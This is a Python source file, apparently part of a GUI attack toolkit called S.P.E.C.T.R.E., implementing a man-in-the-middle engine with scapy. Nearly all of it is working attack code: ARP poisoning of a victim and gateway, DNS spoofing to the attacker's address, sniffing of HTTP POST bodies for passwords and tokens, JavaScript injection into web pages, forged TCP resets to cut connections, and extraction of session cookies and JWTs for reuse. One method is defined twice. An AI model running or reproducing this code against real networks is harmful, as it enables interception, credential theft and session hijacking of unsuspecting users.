# S.P.E.C.T.R.E. Engine - Licensed under AGPL-3.0
# Copyright (c) 2026 M. Sami Furqan. All rights reserved.
# See LICENSE file for full terms.

"""
core/mitm_engine.py — Man-in-the-Middle Attack Engine
"""

import time
import socket
import logging
import re
from PySide6.QtCore import QThread, Signal

try:
    from scapy.all import (
        ARP,
        Ether,
        IP,
        UDP,
        TCP,
        DNS,
        DNSQR,
        DNSRR,
        Raw,
        send,
        sendp,
        sniff,
        conf,
        get_if_hwaddr,
    )

    conf.verb = 0
    logging.getLogger("scapy").setLevel(logging.ERROR)
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class MITMEngine(QThread):
    log_signal = Signal(str, str)
    passive_log_signal = Signal(str, str)
    packet_generated = Signal(dict)
    harvester_status_changed = Signal(bool)

    def __init__(
        self,
        target_ip: str,
        gateway_ip: str,
        attack_type: str,
        intensity: int,
        block_target: str = "",  # NEW: For TCP RST Injection
        parent=None,
    ):
        super().__init__(parent)
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.attack_type = attack_type
        self.intensity = intensity
        self.block_target = block_target.lower()  # Store lowercase for matching
        self._running = False

        self.attacker_ip = self._get_local_ip()
        self.attacker_mac = (
            get_if_hwaddr(conf.iface) if SCAPY_AVAILABLE else "00:00:00:00:00:00"
        )

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "192.168.1.50"

    def run(self):
        if not SCAPY_AVAILABLE:
            self.log_signal.emit("CRITICAL: Scapy not installed.", "CRIT")
            return

        self._running = True
        self.log_signal.emit(f"Engine started: {self.attack_type}", "INFO")
        interval = max(0.01, 0.5 - (self.intensity / 200.0))

        try:
            if "ARP" in self.attack_type:
                self._run_arp_mitm(interval)
            elif "DNS" in self.attack_type:
                self._run_dns_spoof()
            elif (
                "CREDENTIAL" in self.attack_type
                or "HARVEST" in self.attack_type
                or "PASSIVE" in self.attack_type
            ):
                self._run_credential_harvester()

            # ── FIX: Check RST/BLOCK *BEFORE* INJECT/HTTP ──
            elif "RST" in self.attack_type or "BLOCK" in self.attack_type:
                self._run_tcp_rst_injector()
            elif "INJECT" in self.attack_type or "HTTP" in self.attack_type:
                self._run_http_injector()
            elif "COOKIE" in self.attack_type or "SESSION" in self.attack_type:
                self._run_cookie_sniffer()
        except Exception as e:
            self.log_signal.emit(f"Engine Error: {str(e)}", "CRIT")
        finally:
            if "CREDENTIAL" in self.attack_type or "HARVEST" in self.attack_type:
                self.harvester_status_changed.emit(False)
            self.log_signal.emit("Engine stopped.", "INFO")

    def stop(self):
        self._running = False
        self.wait(2000)

    def _run_arp_mitm(self, interval):
        self.log_signal.emit(
            f"Starting ARP MITM: Poisoning {self.target_ip} and {self.gateway_ip}",
            "WARN",
        )
        while self._running:
            try:
                pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,
                    psrc=self.gateway_ip,
                    hwsrc=self.attacker_mac,
                    pdst=self.target_ip,
                )
                sendp(pkt1, verbose=0)
                pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,
                    psrc=self.target_ip,
                    hwsrc=self.attacker_mac,
                    pdst=self.gateway_ip,
                )
                sendp(pkt2, verbose=0)
                self.packet_generated.emit(
                    {
                        "prefix": "L2",
                        "subtype": 6,
                        "rssi": -20,
                        "payload_size": 42,
                        "bssid": "FF:FF:FF:FF:FF:FF",
                        "channel": 0,
                    }
                )
                time.sleep(interval)
            except Exception as e:
                self.log_signal.emit(f"ARP MITM Error: {e}", "CRIT")
                break

    def _run_dns_spoof(self):
        self.log_signal.emit(
            f"DNS Spoofer Active. Redirecting all queries to {self.attacker_ip}", "WARN"
        )
        while self._running:
            try:
                sniff(
                    filter="udp port 53",
                    iface=conf.iface,
                    prn=self._spoof_dns_packet,
                    store=0,
                    timeout=2,
                )
            except Exception:
                if self._running:
                    time.sleep(0.5)

    def _spoof_dns_packet(self, packet):
        try:
            if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
                queried_domain = packet[DNSQR].qname.decode("utf-8", errors="ignore")
                self.log_signal.emit(
                    f"Intercepted: {queried_domain} -> Redirecting to {self.attacker_ip}",
                    "TX",
                )
                spoofed_pkt = (
                    Ether(dst=packet[Ether].src)
                    / IP(dst=packet[IP].src, src=packet[IP].dst)
                    / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                    / DNS(
                        id=packet[DNS].id,
                        qr=1,
                        aa=1,
                        qd=packet[DNS].qd,
                        an=DNSRR(
                            rrname=packet[DNSQR].qname, ttl=10, rdata=self.attacker_ip
                        ),
                    )
                )
                sendp(spoofed_pkt, verbose=0)
        except Exception:
            pass

    def _run_credential_harvester(self):
        self.passive_log_signal.emit(
            "Credential Harvester Active. Listening on TCP Port 80...", "INFO"
        )
        self.harvester_status_changed.emit(True)
        while self._running:
            try:
                sniff(
                    filter="tcp port 80",
                    iface=conf.iface,
                    prn=self._parse_http_packet,
                    store=0,
                    timeout=2,
                )
            except Exception:
                if self._running:
                    time.sleep(0.5)

    def _parse_http_packet(self, packet):
        try:
            if not packet.haslayer(Raw) or not packet.haslayer(TCP):
                return
            payload = packet[Raw].load.decode("utf-8", errors="ignore")
            src_ip = packet[IP].src if packet.haslayer(IP) else "UNKNOWN"
            if payload.startswith("POST "):
                keywords = [
                    "user",
                    "pass",
                    "email",
                    "pwd",
                    "login",
                    "auth",
                    "token",
                    "name",
                ]
                found_data = []
                if "\r\n\r\n" in payload:
                    body = payload.split("\r\n\r\n", 1)[1]
                    for param in body.split("&"):
                        for kw in keywords:
                            if kw in param.lower() and "=" in param:
                                found_data.append(param.strip())
                if found_data:
                    self.passive_log_signal.emit(
                        f" CREDENTIALS DETECTED from {src_ip}:", "CRIT"
                    )
                    for data in found_data:
                        self.passive_log_signal.emit(f"   -> {data}", "DATA")
            elif "Cookie:" in payload:
                for line in payload.split("\r\n"):
                    if line.startswith("Cookie:"):
                        self.passive_log_signal.emit(
                            f" COOKIE from {src_ip}: {line.strip()}", "DATA"
                        )
                        break
        except Exception:
            pass

    def _run_http_injector(self):
        self.passive_log_signal.emit(
            "HTTP Injector Active. Modifying HTML payloads...", "INFO"
        )
        while self._running:
            try:
                sniff(
                    filter="tcp port 80",
                    iface=conf.iface,
                    prn=self._inject_http_payload,
                    store=0,
                    timeout=2,
                )
            except Exception:
                if self._running:
                    time.sleep(0.5)

    def _inject_http_payload(self, packet):
        try:
            if (
                not packet.haslayer(Raw)
                or not packet.haslayer(TCP)
                or not packet.haslayer(IP)
            ):
                return
            payload = packet[Raw].load
            if b"S.P.E.C.T.R.E." in payload:
                return
            if b"HTTP/1." in payload and b"text/html" in payload.lower():
                if b"\r\n\r\n" in payload:
                    headers, body = payload.split(b"\r\n\r\n", 1)
                    js_payload = b"<script>document.body.bgColor='#000';document.body.style.color='#0f0';alert('S.P.E.C.T.R.E.');</script>"
                    if len(payload) + len(js_payload) > 1400:
                        return
                    new_body = js_payload + body
                    headers = re.sub(rb"(?i)Content-Length:\s*\d+\r\n", b"", headers)
                    headers += f"Content-Length: {len(new_body)}\r\n".encode()
                    packet[Raw].load = headers + b"\r\n\r\n" + new_body
                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[TCP].chksum
                    sendp(packet, verbose=0)
                    self.passive_log_signal.emit(
                        f"💉 Injected JS payload to {packet[IP].dst}", "DATA"
                    )
        except Exception as e:
            self.passive_log_signal.emit(f" Injection Error: {str(e)}", "CRIT")

    # ── NEW: TCP RST INJECTION LOGIC ──────────────────────────────────────
    def _run_tcp_rst_injector(self):
        if not self.block_target:
            self.passive_log_signal.emit(
                "❌ CRITICAL: No Block Target specified in UI!", "CRIT"
            )
            return

        self.passive_log_signal.emit(
            f"🛑 TCP RST Injector Active. Blocking: {self.block_target}", "WARN"
        )
        self.passive_log_signal.emit("Listening on TCP Port 80 & 443...", "INFO")

        while self._running:
            try:
                sniff(
                    filter="tcp port 80 or tcp port 443",
                    iface=conf.iface,
                    prn=self._inject_rst_packet,
                    store=0,
                    timeout=2,
                )
            except Exception:
                if self._running:
                    time.sleep(0.5)

    def _run_tcp_rst_injector(self):
        if not self.block_target:
            self.passive_log_signal.emit(
                "❌ CRITICAL: No Block Target specified in UI!", "CRIT"
            )
            return

        self.blocked_ips = set()

        # FIX 1: Resolve domain names to IP addresses so we can block established connections
        try:
            socket.inet_aton(self.block_target)
            self.blocked_ips.add(self.block_target)
            self.passive_log_signal.emit(f"🛑 Blocking IP: {self.block_target}", "WARN")
        except socket.error:
            # It's a domain name, resolve it
            try:
                resolved_ip = socket.gethostbyname(self.block_target)
                self.blocked_ips.add(resolved_ip)
                self.passive_log_signal.emit(
                    f"🛑 Resolved {self.block_target} to {resolved_ip}", "WARN"
                )
            except socket.gaierror:
                self.passive_log_signal.emit(
                    f"❌ CRITICAL: Could not resolve domain {self.block_target}", "CRIT"
                )
                return

        self.passive_log_signal.emit("Listening on TCP Port 80 & 443...", "INFO")

        while self._running:
            try:
                sniff(
                    filter="tcp port 80 or tcp port 443",
                    iface=conf.iface,
                    prn=self._inject_rst_packet,
                    store=0,
                    timeout=2,
                )
            except Exception:
                if self._running:
                    time.sleep(0.5)

    def _inject_rst_packet(self, packet):
        try:
            if not packet.haslayer(IP) or not packet.haslayer(TCP):
                return

            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            seq = packet[TCP].seq
            ack = packet[TCP].ack

            # 1. Check if the IP matches the resolved blocked IPs
            is_blocked = dst_ip in self.blocked_ips or src_ip in self.blocked_ips

            # 2. Fallback: Check if the domain name is in the raw payload (e.g., HTTP Host header)
            if not is_blocked and self.block_target and packet.haslayer(Raw):
                payload_str = packet[Raw].load.decode("utf-8", errors="ignore").lower()
                if self.block_target in payload_str:
                    is_blocked = True

            if is_blocked:
                # FIX 2: Calculate the correct next sequence number based on payload length
                payload_len = len(packet[Raw].load) if packet.haslayer(Raw) else 0
                next_seq = seq + payload_len

                # FORGE RST #1: Same direction as the sniffed packet
                rst_same_dir = IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=sport, dport=dport, flags="R", seq=next_seq
                )
                send(rst_same_dir, verbose=0)

                # FORGE RST #2: Opposite direction
                rst_opposite_dir = IP(src=dst_ip, dst=src_ip) / TCP(
                    sport=dport, dport=sport, flags="R", seq=ack
                )
                send(rst_opposite_dir, verbose=0)

                self.passive_log_signal.emit(
                    f"🛑 TCP RST INJECTED: {src_ip}:{sport} <-> {dst_ip}:{dport} (Killed connection to {self.block_target})",
                    "CRIT",
                )
        except Exception:
            pass

    def _run_cookie_sniffer(self):
        """Sniffs HTTP traffic specifically for session cookies."""
        self.passive_log_signal.emit(
            "Cookie & Session Sniffer Active. Listening for session tokens...", "INFO"
        )
        self.passive_log_signal.emit(
            "Targeting: sessionid, PHPSESSID, JSESSIONID, JWT, etc.", "WARN"
        )

        while self._running:
            try:
                sniff(
                    filter="tcp port 80",
                    iface=conf.iface,
                    prn=self._parse_cookie_packet,
                    store=0,
                    timeout=2,
                )
            except Exception:
                if self._running:
                    time.sleep(0.5)

    def _parse_cookie_packet(self, packet):
        """Extracts and filters session cookies from HTTP requests."""
        try:
            if (
                not packet.haslayer(Raw)
                or not packet.haslayer(TCP)
                or not packet.haslayer(IP)
            ):
                return

            payload = packet[Raw].load.decode("utf-8", errors="ignore")
            src_ip = packet[IP].src

            # Only look at HTTP Requests (GET/POST)
            if payload.startswith("GET ") or payload.startswith("POST "):
                for line in payload.split("\r\n"):
                    if line.lower().startswith("cookie:"):
                        cookie_string = line.split(":", 1)[1].strip()
                        self._analyze_cookies(cookie_string, src_ip)
                        break
        except Exception:
            pass

    def _analyze_cookies(self, cookie_string, src_ip):
        """Filters the cookie string for known session identifiers."""
        # Common session identifiers used by web frameworks
        session_keys = [
            "sessionid",
            "phpsessid",
            "jsessionid",
            "connect.sid",
            "jwt",
            "token",
            "auth",
            "sid",
            "sess",
            "csrf_token",
        ]

        found_sessions = []
        for cookie in cookie_string.split(";"):
            cookie = cookie.strip()
            if "=" in cookie:
                key, value = cookie.split("=", 1)
                if key.lower() in session_keys:
                    found_sessions.append(f"{key}={value}")

        if found_sessions:
            self.passive_log_signal.emit(
                f" SESSION TOKENS DETECTED from {src_ip}:", "CRIT"
            )
            for sess in found_sessions:
                # Formatted cleanly so you can easily double-click and copy it
                self.passive_log_signal.emit(f"   -> {sess}", "DATA")

    def _run_session_jwt_sniffer(self):
        """Sniffs specifically for Session Cookies and JWTs."""
        self.passive_log_signal.emit(
            "Session & JWT Sniffer Active. Hunting for tokens...", "INFO"
        )
        self.passive_log_signal.emit(
            "Targeting: Set-Cookie, Authorization: Bearer", "WARN"
        )

        while self._running:
            try:
                sniff(
                    filter="tcp port 80",
                    iface=conf.iface,
                    prn=self._parse_session_packet,
                    store=0,
                    timeout=2,
                )
            except Exception:
                if self._running:
                    time.sleep(0.5)

    def _parse_session_packet(self, packet):
        """Extracts Session Cookies and JWTs from HTTP traffic."""
        try:
            if (
                not packet.haslayer(Raw)
                or not packet.haslayer(TCP)
                or not packet.haslayer(IP)
            ):
                return

            payload = packet[Raw].load.decode("utf-8", errors="ignore")
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst

            # 1. Catch Set-Cookie in Server Responses (Token Issuance)
            if payload.startswith("HTTP/1."):
                for line in payload.split("\r\n"):
                    if line.lower().startswith("set-cookie:"):
                        cookie_data = line.split(":", 1)[1].strip()
                        if (
                            "sessionid=" in cookie_data.lower()
                            or "sess=" in cookie_data.lower()
                        ):
                            self.passive_log_signal.emit(
                                f"🍪 SESSION COOKIE ISSUED to {dst_ip}:", "CRIT"
                            )
                            self.passive_log_signal.emit(f"   -> {cookie_data}", "DATA")

            # 2. Catch Authorization: Bearer in Client Requests (JWT Usage)
            if payload.startswith("GET ") or payload.startswith("POST "):
                for line in payload.split("\r\n"):
                    if line.lower().startswith("authorization: bearer "):
                        jwt_token = line.split(":", 1)[1].strip().split(" ", 1)[1]
                        self.passive_log_signal.emit(
                            f"🔑 JWT CAPTURED from {src_ip}:", "CRIT"
                        )
                        self.passive_log_signal.emit(f"   -> {jwt_token}", "DATA")

        except Exception:
            pass
